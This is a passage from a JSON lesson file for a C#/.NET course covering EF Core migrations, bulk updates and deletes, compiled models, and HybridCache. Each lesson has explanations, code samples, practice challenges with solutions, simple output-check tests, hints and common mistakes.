s.SetProperty(e => e.Salary, e => e.Salary * 1.1m));\");\nConsole.WriteLine(\"\\nGenerated SQL:\");\nConsole.WriteLine(\"  UPDATE Employees SET Salary = Salary * 1.1 WHERE Department = 'Engineering'\");\nConsole.WriteLine(\"✓ FAST: Single SQL statement!\");\n\nConsole.WriteLine(\"\\nBULK DELETE: Remove low-salary employees\");\nConsole.WriteLine(\"Code:\");\nConsole.WriteLine(\"  context.Employees.Where(e => e.Salary < 30000).ExecuteDelete();\");\nConsole.WriteLine(\"\\nGenerated SQL:\");\nConsole.WriteLine(\"  DELETE FROM Employees WHERE Salary < 30000\");\nConsole.WriteLine(\"✓ FAST: Single SQL statement!\");\n\nConsole.WriteLine(\"\\n=== PERFORMANCE COMPARISON ===\");\nConsole.WriteLine(\"\\nTRADITIONAL (Slow):\");\nConsole.WriteLine(\"  var employees = context.Employees.Where(e => ...).ToList();\");\nConsole.WriteLine(\"  foreach (var e in employees) { e.Salary *= 1.1; }\");\nConsole.WriteLine(\"  context.SaveChanges();\");\nConsole.WriteLine(\"  Result: 1000 employees = 1000 UPDATE statements!\");\n\nConsole.WriteLine(\"\\nBULK (Fast):\");\nConsole.WriteLine(\"  context.Employees.Where(e => ...).ExecuteUpdate(...);\");\nConsole.WriteLine(\"  Result: 1000 employees = 1 UPDATE statement!\");\nConsole.WriteLine(\"  Performance: 100x-1000x faster for large datasets!\");",
              "solution": "using Microsoft.EntityFrameworkCore;\nusing System;\nusing System.Linq;\n\nclass Employee\n{\n    public int Id { get; set; }\n    public string Name { get; set; } = string.Empty;\n    public decimal Salary { get; set; }\n    public string Department { get; set; } = string.Empty;\n}\n\nclass CompanyDbContext : DbContext\n{\n    public DbSet<Employee> Employees { get; set; }\n    \n    protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)\n    {\n        optionsBuilder.UseSqlite(\"Data Source=company.db\");\n    }\n}\n\nConsole.WriteLine(\"═══════════════════════════════════════════\");\nConsole.WriteLine(\"  EF CORE: MIGRATIONS & BULK OPERATIONS\");\nConsole.WriteLine(\"═══════════════════════════════════════════\\n\");\n\nConsole.WriteLine(\"=== PART 1: MIGRATIONS WORKFLOW ===\");\nConsole.WriteLine(\"\\nStep 1: Create Initial Schema\");\nConsole.WriteLine(\"  → dotnet ef migrations add InitialCreate\");\nConsole.WriteLine(\"  Creates: Migrations/20240115120000_InitialCreate.cs\");\nConsole.WriteLine(\"  Contains: Up() creates Employees table, Down() drops it\\n\");\n\nConsole.WriteLine(\"Step 2: Apply to Database\");\nConsole.WriteLine(\"  → dotnet ef database update\");\nConsole.WriteLine(\"  Result: Database created with schema from code\\n\");\n\nConsole.WriteLine(\"Step 3: Evolve Schema (Add property)\");\nConsole.WriteLine(\"  Code change: public bool IsActive { get; set; }\");\nConsole.WriteLine(\"  → dotnet ef migrations add AddIsActive\");\nConsole.WriteLine(\"  Creates: New migration file\\n\");\n\nConsole.WriteLine(\"Step 4: Apply New Migration\");\nConsole.WriteLine(\"  → dotnet ef database update\");\nConsole.WriteLine(\"  Result: IsActive column added to table\");\nConsole.WriteLine(\"  ✓ Database schema evolves with code!\");\n\nConsole.WriteLine(\"\\n=== PART 2: BULK OPERATIONS (EF Core 7+) ===\");\n\nConsole.WriteLine(\"\\n[BULK UPDATE] 10% raise for Engineering department\");\nConsole.WriteLine(\"\\n  OLD WAY (Slow):\");\nConsole.WriteLine(\"    var engineers = context.Employees\");\nConsole.WriteLine(\"                          .Where(e => e.Department == 'Engineering')\");\nConsole.WriteLine(\"                          .ToList();  // Load into memory\");\nConsole.WriteLine(\"    foreach (var e in engineers)\");\nConsole.WriteLine(\"        e.Salary *= 1.1m;\");\nConsole.WriteLine(\"    context.SaveChanges();  // N UPDATE statements!\");\nConsole.WriteLine(\"    Performance: 1000 rows = 1000 database round-trips\\n\");\n\nConsole.WriteLine(\"  NEW WAY (Fast):\");\nConsole.WriteLine(\"    context.Employees\");\nConsole.WriteLine(\"        .Where(e => e.Department == 'Engineering')\");\nConsole.WriteLine(\"        .ExecuteUpdate(s => s.SetProperty(e => e.Salary, e => e.Salary * 1.1m));\");\nConsole.WriteLine(\"\\n    Generated SQL:\");\nConsole.WriteLine(\"      UPDATE Employees \");\nConsole.WriteLine(\"      SET Salary = Salary * 1.1 \");\nConsole.WriteLine(\"      WHERE Department = 'Engineering'\");\nConsole.WriteLine(\"\\n    Performance: 1000 rows = 1 database statement!\");\nConsole.WriteLine(\"    ✓ 100x-1000x FASTER!\\n\");\n\nConsole.WriteLine(\"[BULK DELETE] Remove employees with salary < $30,000\");\nConsole.WriteLine(\"\\n  Code:\");\nConsole.WriteLine(\"    int deleted = context.Employees\");\nConsole.WriteLine(\"        .Where(e => e.Salary < 30000)\");\nConsole.WriteLine(\"        .ExecuteDelete();\");\nConsole.WriteLine(\"\\n  Generated SQL:\");\nConsole.WriteLine(\"    DELETE FROM Employees WHERE Salary < 30000\");\nConsole.WriteLine(\"\\n  ✓ Single SQL statement, no loading into memory!\");\n\nConsole.WriteLine(\"\\n=== KEY BENEFITS ===\");\nConsole.WriteLine(\"\\nMigrations:\");\nConsole.WriteLine(\"  ✓ Version control for database schema\");\nConsole.WriteLine(\"  ✓ Rollback capability (go to previous version)\");\nConsole.WriteLine(\"  ✓ Team-friendly (migrations in source control)\");\nConsole.WriteLine(\"  ✓ Deployment automation (apply on production)\");\n\nConsole.WriteLine(\"\\nBulk Operations:\");\nConsole.WriteLine(\"  ✓ Massive performance gains (100x+)\");\nConsole.WriteLine(\"  ✓ Less memory usage (no loading into C#)\");\nConsole.WriteLine(\"  ✓ Atomic operations (all-or-nothing)\");\nConsole.WriteLine(\"  ✓ Database-side execution (efficient!)\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"MIGRATIONS\"",
                  "expectedOutput": "MIGRATIONS",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"BULK OPERATIONS\"",
                  "expectedOutput": "BULK OPERATIONS",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"ExecuteUpdate\"",
                  "expectedOutput": "ExecuteUpdate",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"ExecuteDelete\"",
                  "expectedOutput": "ExecuteDelete",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"dotnet ef\"",
                  "expectedOutput": "dotnet ef",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output should contain \"FASTER\"",
                  "expectedOutput": "FASTER",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Migrations: dotnet ef migrations add Name, dotnet ef database update. Bulk: .ExecuteUpdate(s => s.SetProperty()), .ExecuteDelete(). Bulk = single SQL, traditional = N SQL statements!"
                },
                {
                  "level": 2,
                  "text": "Migrations without EF tools: Must install 'dotnet ef' CLI tool! Run 'dotnet tool install --global dotnet-ef'. Also need Microsoft.EntityFrameworkCore.Design package!"
                },
                {
                  "level": 3,
                  "text": "Production migration: Don't use EnsureCreated() in production! Use migrations. EnsureCreated() can't update schema. Migrations = professional approach."
                },
                {
                  "level": 4,
                  "text": "Bulk operations and tracking: ExecuteUpdate/Delete DON'T update change tracker! If entities loaded, they're now stale. Either reload or don't mix bulk with tracking."
                },
                {
                  "level": 5,
                  "text": "ExecuteUpdate syntax: SetProperty takes TWO lambdas: property selector AND value expression. 's => s.SetProperty(e => e.Price, e => e.Price * 1.1)'. Easy to forget second lambda!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Migrations without EF tools",
                  "consequence": "Must install 'dotnet ef' CLI tool! Run 'dotnet tool install --global dotnet-ef'. Also need Microsoft.EntityFrameworkCore.Design package!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "EnsureCreated() in Production (Career-Ending Mistake!)",
                  "consequence": "Using EnsureCreated() in production is a TRAP! It works initially, but when you need to add a column or fix a relationship, you'll discover you can't update the schema without destroying all data. Teams have lost weeks of work to this mistake!",
                  "correction": "Production apps MUST use Migrations: 'dotnet ef migrations add [Name]' → 'dotnet ef database update'. Migrations provide: version-controlled schema history, rollback capability, team collaboration, CI/CD integration. EnsureCreated() has NONE of these. Treat EnsureCreated() like 'Console.WriteLine debugging' - fine for learning, never for production."
                },
                {
                  "mistake": "Bulk operations and tracking",
                  "consequence": "ExecuteUpdate/Delete DON'T update change tracker! If entities loaded, they're now stale. Either reload or don't mix bulk with tracking.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "ExecuteUpdate syntax",
                  "consequence": "SetProperty takes TWO lambdas: property selector AND value expression. 's => s.SetProperty(e => e.Price, e => e.Price * 1.1)'. Easy to forget second lambda!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-12-07",
          "title": "EF Core Compiled Models (Startup Performance)",
          "moduleId": "module-12",
          "order": 7,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine opening a restaurant:\n\nWITHOUT COMPILED MODELS:\nEvery morning, chef rebuilds the entire menu from scratch:\n- Reads all recipes\n- Calculates ingredients\n- Sets up stations\n- 30 minutes before serving!\n\nWITH COMPILED MODELS:\nChef pre-builds menu once, stores it:\n- Opens restaurant\n- Menu already ready\n- Serves immediately!\n\nEF Core normally builds your model at startup:\n- Scans all entity classes\n- Discovers relationships\n- Configures conventions\n- For 500 entities = SLOW startup!\n\nCompiled Models do this at BUILD time:\n- Model pre-generated as C# code\n- Startup just loads the code\n- 60-80% faster startup for large models!\n\nNEW in EF Core 9: AUTO-COMPILED MODELS!\n- Install Microsoft.EntityFrameworkCore.Tasks package\n- Model regenerates AUTOMATICALLY when you build\n- No more forgetting to run 'dotnet ef dbcontext optimize'!\n\nThink: Compiled Models = 'Pre-cooked model, just reheat and serve!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates Compiled Models in EF Core 9.",
              "code": "// === OPTION 1: Manual Generation (Traditional) ===\n// Run in terminal:\n// dotnet ef dbcontext optimize --output-dir CompiledModels --namespace MyApp.CompiledModels\n\n// This generates files like:\n// CompiledModels/\n//   MyDbContextModel.cs\n//   ProductEntityType.cs\n//   OrderEntityType.cs\n//   ... (one file per entity)\n\n// Then use in DbContext:\npublic class AppDbContext : DbContext\n{\n    public DbSet<Product> Products { get; set; }\n    public DbSet<Order> Orders { get; set; }\n    \n    protected override void OnConfiguring(\n        DbContextOptionsBuilder options)\n    {\n        options\n            // Use the compiled model!\n            .UseModel(MyApp.CompiledModels.AppDbContextModel.Instance)\n            .UseSqlServer(connectionString);\n    }\n}\n\n// === OPTION 2: Auto-Compiled Models (EF Core 9 - RECOMMENDED!) ===\n// Step 1: Install the MSBuild task package\n// dotnet add package Microsoft.EntityFrameworkCore.Tasks --version 9.0.0\n\n// Step 2: Add to your .csproj file:\n// <PropertyGroup>\n//   <EFOptimizeContext>true</EFOptimizeContext>\n// </PropertyGroup>\n\n// Step 3: Build your project - model auto-regenerates!\n// dotnet build\n// The compiled model is regenerated automatically when\n// your entity types or DbContext configuration changes!\n\n// === PERFORMANCE COMPARISON ===\n// Model with 449 entities, 6390 properties, 720 relationships:\n//\n// Without Compiled Model: Runtime model building\n// With Compiled Model:    60-80% faster startup!\n//\n// The bigger your model, the bigger the savings!\n\n// === WHEN TO USE ===\n// USE: Large models (100+ entities)\n// USE: Microservices (fast cold start critical)\n// USE: Serverless (Azure Functions, AWS Lambda)\n// USE: Container orchestration (Kubernetes pods scaling)\n// SKIP: Small apps (< 50 entities, overhead not worth it)\n// SKIP: Rapid prototyping (still need to rebuild)\n\n// === LIMITATIONS ===\n// - Global Query Filters not compatible with compiled models\n// - Lazy-loading proxies not supported\n// - Must rebuild after entity changes (auto-compile helps!)",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`dotnet ef dbcontext optimize`**: CLI command that generates compiled model. Scans your DbContext, generates C# code representing the model. Traditional approach - run after schema changes!\n\n**`Microsoft.EntityFrameworkCore.Tasks`**: EF Core 9 MSBuild task package. Enables auto-compiled models. Install via NuGet, set EFOptimizeContext=true in .csproj.\n\n**`<EFOptimizeContext>true</EFOptimizeContext>`**: .csproj property that enables automatic model regeneration on every build. No more forgetting to run CLI command!\n\n**`.UseModel(Model.Instance)`**: Tells EF to use pre-built model instead of discovering at runtime. Massive startup speedup for large models.\n\n**Limitations**: Global Query Filters not compatible. No lazy-loading proxies. Must rebuild after entity changes (auto-compile handles this). Worth it for 100+ entities or cold-start sensitive apps."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-12-07-challenge-01",
              "title": "Practice Challenge",
              "description": "Understand EF Core Compiled Models workflow.",
              "instructions": "Demonstrate the Compiled Models workflow!\n\n1. Show the CLI command to generate compiled models (traditional)\n2. Show the EF Core 9 auto-compiled models approach (MSBuild task)\n3. Show how to configure DbContext to use compiled model\n4. Print performance comparison (60-80% faster startup)\n5. List when to use (and when NOT to use)\n6. Show limitations (Global Query Filters, lazy-loading)\n\nExplain why this matters for microservices and serverless!",
              "starterCode": "Console.WriteLine(\"=== EF CORE COMPILED MODELS ===\");\n\nConsole.WriteLine(\"\\nOPTION 1: Traditional CLI Approach\");\n// TODO: Show 'dotnet ef dbcontext optimize' command\n\nConsole.WriteLine(\"\\nOPTION 2: EF Core 9 Auto-Compiled Models\");\n// TODO: Show MSBuild task package setup\n\nConsole.WriteLine(\"\\nSTEP 3: Configure DbContext\");\n// TODO: Show UseModel configuration\n\nConsole.WriteLine(\"\\nPERFORMANCE IMPACT:\");\n// TODO: Show before/after times (60-80% faster)\n\nConsole.WriteLine(\"\\nWHEN TO USE:\");\n// TODO: List use cases\n\nConsole.WriteLine(\"\\nLIMITATIONS:\");\n// TODO: Global Query Filters, lazy-loading proxies",
              "solution": "Console.WriteLine(\"=== EF CORE COMPILED MODELS ===\");\nConsole.WriteLine(\"Pre-build your EF model for 60-80% faster startup!\");\n\nConsole.WriteLine(\"\\n--- OPTION 1: Traditional CLI Approach ---\");\nConsole.WriteLine(\"Run this CLI command:\");\nConsole.WriteLine(@\"\n  dotnet ef dbcontext optimize \\\n    --output-dir CompiledModels \\\n    --namespace MyApp.CompiledModels\n\");\nConsole.WriteLine(\"This generates C# files:\");\nConsole.WriteLine(\"  CompiledModels/\");\nConsole.WriteLine(\"    AppDbContextModel.cs      (main model)\");\nConsole.WriteLine(\"    ProductEntityType.cs       (per entity)\");\nConsole.WriteLine(\"    OrderEntityType.cs\");\nConsole.WriteLine(\"    CustomerEntityType.cs\");\n\nConsole.WriteLine(\"\\n--- OPTION 2: EF Core 9 Auto-Compiled Models (RECOMMENDED) ---\");\nConsole.WriteLine(\"Step 1: Install MSBuild task package:\");\nConsole.WriteLine(@\"\n  dotnet add package Microsoft.EntityFrameworkCore.Tasks --version 9.0.0\n\");\nConsole.WriteLine(\"Step 2: Add to your .csproj file:\");\nConsole.WriteLine(@\"\n  <PropertyGroup>\n    <EFOptimizeContext>true</EFOptimizeContext>\n  </PropertyGroup>\n\");\nConsole.WriteLine(\"Step 3: Just build! Model auto-regenerates when entities change.\");\nConsole.WriteLine(\"  dotnet build\");\n\nConsole.WriteLine(\"\\n--- Configure DbContext ---\");\nConsole.WriteLine(@\"\npublic class AppDbContext : DbContext\n{\n    protected override void OnConfiguring(\n        DbContextOptionsBuilder options)\n    {\n        options\n            // Use pre-built model!\n            .UseModel(CompiledModels.AppDbContextModel.Instance)\n            .UseSqlServer(connectionString);\n    }\n}\n\");\n\nConsole.WriteLine(\"\\n--- PERFORMANCE IMPACT ---\");\nConsole.WriteLine(\"Large models see significant startup improvements:\");\nConsole.WriteLine(\"+---------------------------+---------------+\");\nConsole.WriteLine(\"| Method                    | Startup       |\");\nConsole.WriteLine(\"+---------------------------+---------------+\");\nConsole.WriteLine(\"| Runtime model building    | Baseline      |\");\nConsole.WriteLine(\"| Compiled model            | 60-80% FASTER |\");\nConsole.WriteLine(\"+---------------------------+---------------+\");\nConsole.WriteLine(\"The larger your model, the bigger the savings!\");\n\nConsole.WriteLine(\"\\n--- WHEN TO USE ---\");\nConsole.WriteLine(\"USE Compiled Models when:\");\nConsole.WriteLine(\"  + Large models (100+ entities)\");\nConsole.WriteLine(\"  + Microservices (scaling needs fast cold starts)\");\nConsole.WriteLine(\"  + Serverless (Azure Functions, AWS Lambda)\");\nConsole.WriteLine(\"  + Container orchestration (Kubernetes pods)\");\n\nConsole.WriteLine(\"\\nSKIP Compiled Models when:\");\nConsole.WriteLine(\"  - Small models (< 50 entities)\");\nConsole.WriteLine(\"  - Startup time not critical\");\n\nConsole.WriteLine(\"\\n--- LIMITATIONS ---\");\nConsole.WriteLine(\"  - Global Query Filters NOT compatible\");\nConsole.WriteLine(\"  - Lazy-loading proxies NOT supported\");\nConsole.WriteLine(\"  - Must rebuild after entity changes (auto-compile handles this!)\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output contains 'COMPILED MODELS'",
                  "expectedOutput": "COMPILED MODELS",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output contains 'dotnet ef'",
                  "expectedOutput": "dotnet ef",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output contains 'UseModel'",
                  "expectedOutput": "UseModel",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output contains 'PERFORMANCE'",
                  "expectedOutput": "PERFORMANCE",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output contains 'FASTER'",
                  "expectedOutput": "FASTER",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output contains 'Serverless'",
                  "expectedOutput": "Serverless",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "CLI: 'dotnet ef dbcontext optimize --output-dir CompiledModels'. EF Core 9: Install Microsoft.EntityFrameworkCore.Tasks, set EFOptimizeContext=true. DbContext: options.UseModel(Model.Instance)."
                },
                {
                  "level": 2,
                  "text": "Performance gains are only significant for large models (100+ entities). Small apps won't see much difference."
                },
                {
                  "level": 3,
                  "text": "With traditional CLI, must regenerate after entity changes! EF Core 9's auto-compile handles this automatically on build."
                },
                {
                  "level": 4,
                  "text": "EF Core 9's auto-compiled models use MSBuild tasks - regenerates automatically when you build. No more forgetting!"
                },
                {
                  "level": 5,
                  "text": "Limitations: Global Query Filters not compatible, no lazy-loading proxies. Check if you use these before adopting."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using on small models",
                  "consequence": "Compiled models add complexity. For < 50 entities, startup is already fast. Overhead not worth it.",
                  "correction": "Only use for large models, microservices, or serverless where cold start matters."
                },
                {
                  "mistake": "Forgetting to regenerate",
                  "consequence": "After changing entities, old compiled model doesn't match! Runtime errors or missing data.",
                  "correction": "Use EF Core 9's auto-compiled models (Microsoft.EntityFrameworkCore.Tasks + EFOptimizeContext=true) to auto-regenerate on build."
                },
                {
                  "mistake": "Expecting query speedup",
                  "consequence": "Compiled models only speed up STARTUP, not queries. Queries still use same SQL generation.",
                  "correction": "For query performance, use indexes, compiled queries, or AsNoTracking()."
                },
                {
                  "mistake": "Using with lazy loading",
                  "consequence": "Compiled models don't support lazy-loading proxies. Proxies require runtime model building.",
                  "correction": "Use eager loading (.Include()) or explicit loading instead."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-12-08",
          "title": "HybridCache (Modern Caching)",
          "moduleId": "module-12",
          "order": 8,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a library with TWO storage systems:\n\nL1 CACHE (In-Memory):\n- Librarian's desk drawer\n- Super fast access\n- Small capacity\n- Only this librarian sees it\n\nL2 CACHE (Distributed - Redis):\n- Central storage room\n- Slower but bigger\n- ALL librarians share it\n- Survives if one librarian goes home\n\nHybridCache combines BOTH:\n1. Check desk drawer (L1) - instant!\n2. If not there, check storage room (L2)\n3. If not there, fetch from warehouse (database)\n4. Store in BOTH caches for next time\n\nHybridCache in modern .NET:\n- One API for both caching levels\n- Automatic stampede protection\n- Tag-based invalidation\n- Replaces IMemoryCache + IDistributedCache juggling\n\nThink: HybridCache = 'The smart librarian who checks everywhere automatically!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates HybridCache in .NET 9.",
              "code": "// === SETUP (.NET 9) ===\n// Install: dotnet add package Microsoft.Extensions.Caching.Hybrid\n\n// Program.cs\nvar builder = WebApplication.CreateBuilder(args);\n\n// Add HybridCache with Redis as L2\nbuilder.Services.AddHybridCache(options =>\n{\n    options.MaximumPayloadBytes = 1024 * 1024; // 1MB max\n    options.MaximumKeyLength = 1024; // Default is 1024\n});\n\n// Add Redis as distributed cache backend\nbuilder.Services.AddStackExchangeRedisCache(options =>\n{\n    options.Configuration = \"localhost:6379\";\n});\n\n// === USAGE ===\npublic class ProductService\n{\n    private readonly HybridCache _cache;\n    private readonly AppDbContext _db;\n    \n    public ProductService(HybridCache cache, AppDbContext db)\n    {\n        _cache = cache;\n        _db = db;\n    }\n    \n    public async Task<Product?> GetProductAsync(int id)\n    {\n        // GetOrCreateAsync: check cache, or run factory\n        return await _cache.GetOrCreateAsync(\n            $\"product:{id}\",  // Cache key\n            async token => await _db.Products.FindAsync(id, token),\n            new HybridCacheEntryOptions\n            {\n                Expiration = TimeSpan.FromMinutes(5),\n                LocalCacheExpiration = TimeSpan.FromMinutes(1)\n            }\n        );\n    }\n}\n\n// === TAG-BASED INVALIDATION (.NET 9 GA) ===\npublic async Task<List<Product>> GetCategoryProductsAsync(string category)\n{\n    return await _cache.GetOrCreateAsync(\n        $\"products:category:{category}\",\n        async token => await _db.Products\n            .Where(p => p.Category == category)\n            .ToListAsync(token),\n        new HybridCacheEntryOptions\n        {\n            Expiration = TimeSpan.FromMinutes(10)\n        },\n        tags: new[] { \"products\", $\"category:{category}\" }  // Tags!\n    );\n}\n\n// Invalidate all products when catalog changes\npublic async Task InvalidateProductCacheAsync()\n{\n    await _cache.RemoveByTagAsync(\"products\");  // Remove ALL tagged entries!\n}\n\n// === STAMPEDE PROTECTION (Automatic!) ===\n// 1000 requests hit cache miss simultaneously?\n// OLD: 1000 database queries (stampede!)\n// HybridCache: Only 1 query, 999 wait for result\n\n// === COMPARISON ===\n// IMemoryCache: Fast, local only, no sharing\n// IDistributedCache: Shared, slower, no local tier\n// HybridCache: BOTH! Fast local + shared distributed",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`AddHybridCache()`**: Registers HybridCache in DI. Automatically uses IDistributedCache if configured (Redis, SQL Server, CosmosDB, Garnet).\n\n**`GetOrCreateAsync(key, factory)`**: The core method. Checks L1 (memory), then L2 (distributed), then runs factory. Stores result in both caches.\n\n**`HybridCacheEntryOptions`**: Configure per-entry. Expiration (total TTL), LocalCacheExpiration (L1 TTL), Flags (skip local/distributed).\n\n**`tags: [\"tag1\", \"tag2\"]`**: Tag entries for bulk invalidation (.NET 9 GA feature). RemoveByTagAsync(\"tag\") removes all entries with that tag.\n\n**Stampede protection**: Built-in! Multiple concurrent requests for same key = only one factory call. Others wait for result. No thundering herd!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-12-08-challenge-01",
              "title": "Practice Challenge",
              "description": "Implement HybridCache patterns.",
              "instructions": "Demonstrate HybridCache usage!\n\n1. Show Program.cs setup with Redis backend\n2. Show GetOrCreateAsync usage in a service\n3. Demonstrate tagging for cache invalidation\n4. Explain stampede protection\n5. Compare to IMemoryCache and IDistributedCache\n6. Show when to use each caching approach\n\nThis is the modern way to cache in .NET!",
              "starterCode": "Console.WriteLine(\"=== HYBRIDCACHE (MODERN CACHING) ===\");\n\nConsole.WriteLine(\"\\n--- SETUP ---\");\n// TODO: Show Program.cs configuration\n\nConsole.WriteLine(\"\\n--- USAGE ---\");\n// TODO: Show GetOrCreateAsync\n\nConsole.WriteLine(\"\\n--- TAGGING ---\");\n// TODO: Show tag-based invalidation\n\nConsole.WriteLine(\"\\n--- STAMPEDE PROTECTION ---\");\n// TODO: Explain automatic protection\n\nConsole.WriteLine(\"\\n--- COMPARISON ---\");\n// TODO: Compare caching approaches",
              "solution": "Console.WriteLine(\"=== HYBRIDCACHE (.NET 9 - MODERN CACHING) ===\");\nConsole.WriteLine(\"Two-level caching: L1 (memory) + L2 (distributed)\");\n\nConsole.WriteLine(\"\\n--- SETUP (Program.cs) ---\");\nConsole.WriteLine(@\"\n// Install: dotnet add package Microsoft.Extensions.Caching.Hybrid\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Add HybridCache\nbuilder.Services.AddHybridCache(options =>\n{\n    options.MaximumPayloadBytes = 1024 * 1024; // 1MB\n    options.MaximumKeyLength = 1024; // Default\n});\n\n// Add Redis as L2 (distributed) cache\nbuilder.Services.AddStackExchangeRedisCache(options =>\n{\n    options.Configuration = \"\"localhost:6379\"\";\n});\n\");\n\nConsole.WriteLine(\"\\n--- USAGE (Service) ---\");\nConsole.WriteLine(@\"\npublic class ProductService(HybridCache cache, AppDbContext db)\n{\n    public async Task<Product?> GetProductAsync(int id)\n    {\n        return await cache.GetOrCreateAsync(\n            $\"\"product:{id}\"\",  // Key\n            async token => await db.Products.FindAsync(id, token),\n            new HybridCacheEntryOptions\n            {\n                Expiration = TimeSpan.FromMinutes(5),      // Total TTL\n                LocalCacheExpiration = TimeSpan.FromMinutes(1) // L1 TTL\n            }\n        );\n    }\n}\n\");\n\nConsole.WriteLine(\"\\n--- TAG-BASED INVALIDATION (.NET 9 GA) ---\");\nConsole.WriteLine(@\"\n// Add with tags\nawait cache.GetOrCreateAsync(\n    \"\"products:electronics\"\",\n    async token => await db.Products.Where(p => p.Category == \"\"Electronics\"\").ToListAsync(),\n    options,\n    tags: new[] { \"\"products\"\", \"\"category:electronics\"\" }\n);\n\n// Invalidate ALL products at once!\nawait cache.RemoveByTagAsync(\"\"products\"\");\n\n// Or just one category\nawait cache.RemoveByTagAsync(\"\"category:electronics\"\");\n\");\n\nConsole.WriteLine(\"\\n--- STAMPEDE PROTECTION ---\");\nConsole.WriteLine(\"Scenario: Cache miss, 1000 concurrent requests\");\nConsole.WriteLine(\"\");\nConsole.WriteLine(\"WITHOUT HybridCache:\");\nConsole.WriteLine(\"  1000 database queries simultaneously! (stampede)\");\nConsole.WriteLine(\"\");\nConsole.WriteLine(\"WITH HybridCache:\");\nConsole.WriteLine(\"  1 database query, 999 requests wait for result\");\nConsole.WriteLine(\"  Automatic! No extra code needed.\");\n\nConsole.WriteLine(\"\\n--- COMPARISON ---\");\nConsole.WriteLine(\"+---------------------+--------+-----------+----------+\");\nConsole.WriteLine(\"| Feature             | Memory | Distrib.  | Hybrid   |\");\nConsole.WriteLine(\"+---------------------+--------+-----------+----------+\");\nConsole.WriteLine(\"| Speed               | Fast   | Slower    | Fast     |\");\nConsole.WriteLine(\"| Shared across pods  | No     | Yes       | Yes      |\");\nConsole.WriteLine(\"| Survives restart    | No     | Yes       | Yes (L2) |\");\nConsole.WriteLine(\"| Stampede protection | No     | No        | YES!     |\");\nConsole.WriteLine(\"| Tag invalidation    | No     | No        | YES!     |\");\nConsole.WriteLine(\"+---------------------+--------+-----------+----------+\");\n\nConsole.WriteLine(\"\\n--- WHEN TO USE ---\");\nConsole.WriteLine(\"IMemoryCache: Single server, simple caching\");\nConsole.WriteLine(\"IDistributedCache: Multi-server, need sharing\");\nConsole.WriteLine(\"HybridCache: The modern default! Best of both worlds.\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output contains 'HYBRIDCACHE'",
                  "expectedOutput": "HYBRIDCACHE",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output contains 'GetOrCreateAsync'",
                  "expectedOutput": "GetOrCreateAsync",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output contains 'TAGGING'",
                  "expectedOutput": "TAGGING",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output contains 'STAMPEDE'",
                  "expectedOutput": "STAMPEDE",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output contains 'RemoveByTagAsync'",
                  "expectedOutput": "RemoveByTagAsync",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output contains 'L1'",
                  "expectedOutput": "L1",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Setup: AddHybridCache() + AddStackExchangeRedisCache(). Usage: cache.GetOrCreateAsync(key, factory, options). Tagging: tags parameter + RemoveByTagAsync()."
                },
                {
                  "level": 2,
                  "text": "HybridCache checks L1 (memory) first, then L2 (Redis), then runs factory. Stores in both levels automatically."
                },
                {
                  "level": 3,
                  "text": "Stampede protection: Multiple callers for same key = one factory call. Others await the result. Built-in, no code needed!"
                },
                {
                  "level": 4,
                  "text": "LocalCacheExpiration vs Expiration: LocalCacheExpiration is L1 TTL (shorter), Expiration is total TTL. L1 expires faster for freshness."
                },
                {
                  "level": 5,
                  "text": "Use tagging for related data: tag all user data with 'user:{id}', then RemoveByTagAsync('user:{id}') on user update."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Not configuring distributed cache",
                  "consequence": "HybridCache works without L2, but you lose shared caching and survive-restart benefits.",
                  "correction": "Add AddStackExchangeRedisCache() or similar for L2 distributed cache."
                },
                {
